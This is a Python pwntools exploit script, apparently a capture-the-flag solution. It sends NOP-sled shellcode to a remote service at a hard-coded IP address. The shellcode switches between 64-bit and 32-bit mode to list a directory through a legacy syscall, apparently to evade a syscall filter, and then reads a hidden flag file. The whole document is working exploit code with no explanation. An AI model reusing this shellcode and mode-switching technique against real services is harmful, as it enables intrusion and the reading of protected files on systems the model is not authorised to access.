from pwn import *
import time

context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('source')
# lib = e.libc


def leak_file_name():
    r = e.process()
    r = remote("34.126.117.161",3000)
    shell_openat=shellcraft.amd64.pushstr("warehouse")
    
    shell_openat+=('''
        mov rsi, rsp
        xor edx, edx       
        xor r10, r10       
        mov rdi, -100       
        push SYS_openat 
        pop rax
        syscall
        
    ''')

    shellcode_read = ('''
        mov rdi, 0
        mov rdx, 0x500
        mov rsi, 0xaabb0100
        mov rax, 0
        syscall
        nop
    ''')
     
    shellcode_x86_64_to_x86 =('''
        mov rsp, 0xaabb0500
        mov DWORD PTR [rsp], 0xaabb0100
        mov DWORD PTR [rsp + 4], 0x23
        retfd
    ''')

    shellcode_getdents=('''
        mov eax, 0x8d
        mov ebx, 3
        mov ecx, 0xaabb0300
        mov edx, 0xa00
        int 0x80
    ''')
    
    shellcode_x86_to_x86_64 =('''
        mov esp, 0xaabb0600
        mov DWORD PTR [rsp], 0xaabb0200
        mov DWORD ptr [rsp + 4], 0x33
        retfd
    ''')
    
    shellcode_write = ('''
        mov rdi, 1
        mov rdx, 0xa00
        mov rsi, 0xaabb0300
        /* call write() */
        mov rax, 1
        syscall
    ''')
    
    shellcode =asm(shell_openat+shellcode_read+shellcode_x86_64_to_x86)

    # print(disasm(shellcode))
    payload=b"\x90"*321+shellcode
    pause()
    r.sendline(payload)
    
    
    payload= asm(shellcode_getdents+shellcode_x86_to_x86_64).ljust(0x100,b"\x90")+asm(shellcode_write)
    pause()
    r.sendline(payload)
    # print("write file")
    x = r.recv(0x500)
    print(x)
    with open('listdir', 'wb') as file:
        file.write(x)
    
    # r.close()
    r.interactive()

def read_flag():
    shellcode =shellcraft.pushstr("warehouse/21e2ae0f_b85fde7bb246e_d90194f601e0_41b3c8ac6e937b1878bd8_e0e796a098")
    # shellcode =shellcraft.pushstr("./flag.txt")

    shellcode += '''
        mov rdi, rsp
        mov rdx, 0
        mov rsi, 0
        mov rax, 2
        syscall
    '''
    
    shellcode+='''
        mov rdi, rax
        mov rdx, 0x100
        mov rsi, 0xaabb0300
        mov rax, 0
        syscall
        nop
    '''
    
    shellcode+='''
        mov rdi, 1
        mov rdx, 0x100
        mov rsi, 0xaabb0300
        /* call write() */
        mov rax, 1
        syscall

    '''
    
    shellcode =asm(shellcode)
    info("shellcode: %s" % shellcode)
    info(len(shellcode))
    r= e.process()
    r = remote("34.126.117.161",3000)
    # time.sleep(1)
    
    payload = b"\x90"*321+shellcode
    pause()
    r.sendline(payload)
    r.interactive()

leak_file_name()
# read_flag()
